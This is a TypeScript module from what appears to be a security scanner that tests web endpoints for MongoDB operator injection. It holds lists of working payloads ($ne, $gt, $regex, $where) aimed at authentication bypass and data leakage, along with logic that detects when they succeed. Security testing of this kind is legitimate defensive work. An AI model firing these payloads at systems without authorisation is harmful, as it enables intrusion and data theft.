/**
 * Scanner: NoSQL injection tester
 *
 * Tests for MongoDB operator injection ($gt, $ne, $regex, $where)
 * in query parameters and JSON request bodies.
 */

import { httpRequest } from "../http-client"
import type { SessionID } from "../../session/schema"
import type { HttpRequestOptions, HttpResponse } from "../http-client"
import { assignJsonValue, collectJsonLeafPaths } from "./json-path"

export interface NoSqlResult {
  vulnerable: boolean
  findings: NoSqlFinding[]
  testedCount: number
}

export interface NoSqlFinding {
  parameter: string
  position: "query" | "body"
  payload: string
  evidence: string
  technique: string
}

// NoSQL operator payloads for query params (URL-encoded)
const QUERY_PAYLOADS: { payload: Record<string, string>; technique: string }[] = [
  { payload: { "[$ne]": "" }, technique: "not-equal bypass" },
  { payload: { "[$gt]": "" }, technique: "greater-than bypass" },
  { payload: { "[$regex]": ".*" }, technique: "regex bypass" },
  { payload: { "[$exists]": "true" }, technique: "exists operator" },
  { payload: { "[$in][]": "admin" }, technique: "in-array bypass" },
]

// NoSQL payloads for JSON body injection
const JSON_PAYLOADS: { payload: unknown; technique: string }[] = [
  { payload: { "$ne": "" }, technique: "not-equal operator" },
  { payload: { "$gt": "" }, technique: "greater-than operator" },
  { payload: { "$regex": ".*" }, technique: "regex operator" },
  { payload: { "$ne": null }, technique: "not-null operator" },
  { payload: { "$exists": true }, technique: "exists operator" },
  { payload: { "$where": "1==1" }, technique: "$where injection" },
]

// Indicators that suggest successful NoSQL injection
const SUCCESS_INDICATORS = [
  // Response suggests authentication bypass or data leak
  "token", "access_token", "jwt", "session", "logged in", "welcome",
  "dashboard", "profile", "admin",
]

const ERROR_INDICATORS = [
  // MongoDB/NoSQL error messages
  "mongoerror", "mongo", "bson", "operator", "castError",
  "invalid operator", "$where", "aggregate", "query",
]

interface NoSqlRequestOptions {
  method?: string
  headers?: Record<string, string>
  cookies?: string
  timeout: number
  sessionID?: SessionID | string
}

function requestOptions(
  config: NoSqlRequestOptions,
  body?: unknown,
): HttpRequestOptions {
  const headers = { ...(config.headers ?? {}) }
  const options: HttpRequestOptions = {
    method: config.method ?? (body === undefined ? "GET" : "POST"),
    headers,
    cookies: config.cookies,
    timeout: config.timeout,
    sessionID: config.sessionID,
  }
  if (body === undefined) return options
  options.body = JSON.stringify(body)
  if (options.method === "GET") options.method = "POST"
  if (!headers["Content-Type"] && !headers["content-type"]) {
    headers["Content-Type"] = "application/json"
  }
  return options
}

function count(input: string, token: string) {
  if (!token) return 0
  let total = 0
  let offset = 0
  while (true) {
    const index = input.indexOf(token, offset)
    if (index === -1) return total
    total++
    offset = index + token.length
  }
}

function indicator(body: string, baseline: string, list: string[]) {
  for (const item of list) {
    const key = item.toLowerCase()
    if (!body.includes(key)) continue
    if (count(body, key) <= count(baseline, key)) continue
    return item
  }
}

function changed(response: HttpResponse, baseline: HttpResponse) {
  if (response.status !== baseline.status) return true
  return response.body !== baseline.body
}

/**
 * Test a single parameter for NoSQL injection via query string.
 */
async function testQueryParam(
  url: string,
  parameter: string,
  baseline: HttpResponse,
  request: NoSqlRequestOptions,
  baseBody?: unknown,
): Promise<NoSqlFinding[]> {
  const findings: NoSqlFinding[] = []

  for (const { payload, technique } of QUERY_PAYLOADS) {
    const u = new URL(url)
    // Remove original param and add operator variant
    u.searchParams.delete(parameter)
    for (const [suffix, value] of Object.entries(payload)) {
      u.searchParams.set(`${parameter}${suffix}`, value)
    }

    const resp = await httpRequest(u.href, requestOptions(request, baseBody))

    // Check for authentication bypass (status changed from 401/403 to 200)
    if ((baseline.status === 401 || baseline.status === 403) && resp.status === 200) {
      findings.push({
        parameter,
        position: "query",
        payload: u.searchParams.toString(),
        evidence: `Status changed from ${baseline.status} to ${resp.status} — likely auth bypass`,
        technique,
      })
      continue
    }

    // Check for significant length difference (data leak)
    if (
      resp.status === 200 &&
      Math.abs(resp.body.length - baseline.body.length) > Math.max(32, baseline.body.length * 0.5)
    ) {
      findings.push({
        parameter,
        position: "query",
        payload: u.searchParams.toString(),
        evidence: `Response length changed significantly: ${baseline.body.length} → ${resp.body.length}`,
        technique,
      })
      continue
    }

    // Check for success indicators
    const lower = resp.body.toLowerCase()
    const success = indicator(lower, baseline.body.toLowerCase(), SUCCESS_INDICATORS)
    if (success && changed(resp, baseline) && !lower.includes("error")) {
      findings.push({
        parameter,
        position: "query",
        payload: u.searchParams.toString(),
        evidence: `Found new indicator "${success}" in response`,
        technique,
      })
      continue
    }

    // Check for error-based information leakage
    const error = indicator(lower, baseline.body.toLowerCase(), ERROR_INDICATORS)
    if (error && changed(resp, baseline)) {
      findings.push({
        parameter,
        position: "query",
        payload: u.searchParams.toString(),
        evidence: `NoSQL error indicator "${error}" in response`,
        technique: `error-based: ${technique}`,
      })
    }
  }

  return findings
}

/**
 * Test a parameter for NoSQL injection via JSON body.
 */
async function testJsonBody(
  url: string,
  parameter: string,
  baseBody: unknown,
  baseline: HttpResponse,
  request: NoSqlRequestOptions,
): Promise<NoSqlFinding[]> {
  const findings: NoSqlFinding[] = []

  for (const { payload, technique } of JSON_PAYLOADS) {
    const body = assignJsonValue(baseBody, parameter, payload)
    const resp = await httpRequest(url, requestOptions(request, body))

    // Auth bypass check
    if ((baseline.status === 401 || baseline.status === 403) && resp.status === 200) {
      findings.push({
        parameter,
        position: "body",
        payload: JSON.stringify(payload),
        evidence: `Status changed from ${baseline.status} to ${resp.status} — likely auth bypass`,
        technique,
      })
      continue
    }

    // Length difference
    if (
      resp.status === 200 &&
      Math.abs(resp.body.length - baseline.body.length) > Math.max(24, baseline.body.length * 0.3)
    ) {
      findings.push({
        parameter,
        position: "body",
        payload: JSON.stringify(payload),
        evidence: `Response length: ${baseline.body.length} → ${resp.body.length}`,
        technique,
      })
      continue
    }

    // Error indicators
    const lower = resp.body.toLowerCase()
    const error = indicator(lower, baseline.body.toLowerCase(), ERROR_INDICATORS)
    if (error && changed(resp, baseline)) {
      findings.push({
        parameter,
        position: "body",
        payload: JSON.stringify(payload),
        evidence: `NoSQL error: "${error}" in response`,
        technique: `error-based: ${technique}`,
      })
      continue
    }

    const success = indicator(lower, baseline.body.toLowerCase(), SUCCESS_INDICATORS)
    if (success && changed(resp, baseline) && !lower.includes("error")) {
      findings.push({
        parameter,
        position: "body",
        payload: JSON.stringify(payload),
        evidence: `Found new indicator "${success}" in response`,
        technique,
      })
    }
  }

  return findings
}

/**
 * Test URL parameters and JSON body for NoSQL injection.
 */
export async function testNoSql(
  url: string,
  options: {
    parameters?: string[]
    position?: "query" | "body" | "json"
    method?: string
    headers?: Record<string, string>
    cookies?: string
    jsonBody?: unknown
    timeout?: number
    sessionID?: SessionID | string
  } = {},
): Promise<NoSqlResult> {
  const { parameters, position, method, headers, cookies, jsonBody, timeout = 10_000, sessionID } = options
  let testedCount = 0
  const allFindings: NoSqlFinding[] = []
  const request: NoSqlRequestOptions = {
    method,
    headers,
    cookies,
    timeout,
    sessionID,
  }

  // Baseline request
  const baseline = await httpRequest(url, requestOptions(request, jsonBody))
  const wantQuery = !position || position === "query"
  const wantBody = position === "body" || position === "json" || !position

  // Test query parameters
  const parsedUrl = new URL(url)
  const queryParams = parameters ?? [...parsedUrl.searchParams.keys()]

  if (wantQuery) {
    for (const param of queryParams) {
      testedCount += QUERY_PAYLOADS.length
      const findings = await testQueryParam(url, param, baseline, request, jsonBody)
      allFindings.push(...findings)
    }
  }

  // Test JSON body
  const bodyParams = parameters ?? collectJsonLeafPaths(jsonBody)
  if (wantBody && jsonBody && typeof jsonBody === "object") {
    for (const param of bodyParams) {
      testedCount += JSON_PAYLOADS.length
      const findings = await testJsonBody(url, param, jsonBody, baseline, request)
      allFindings.push(...findings)
    }
  }

  return {
    vulnerable: allFindings.length > 0,
    findings: allFindings,
    testedCount,
  }
}
